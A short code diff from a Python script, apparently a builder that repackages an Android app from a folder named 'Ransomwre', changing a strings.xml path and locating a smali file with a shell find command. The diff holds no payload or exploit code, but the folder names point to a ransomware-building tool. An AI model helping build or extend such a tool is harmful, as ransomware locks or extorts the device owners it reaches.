@@ -110,7 +110,7 @@ def start():
         "Ransomwre/res/drawable-hdpi-v4/ic_launcher.png",
         "Ransomwre/res/drawable-xxhdpi-v4/ic_launcher.png",
     ]
-    strings = "HryJoon/res/values/strings.xml"
+    strings = "Ransomwre/res/values/strings.xml"
     print("I: Using strings "+strings)
     smali = os.popen(f"find -L Ransomwre/ -name '*0000.smali'","r").readline().strip()
     print("I: Using smali "+os.path.basename(smali))
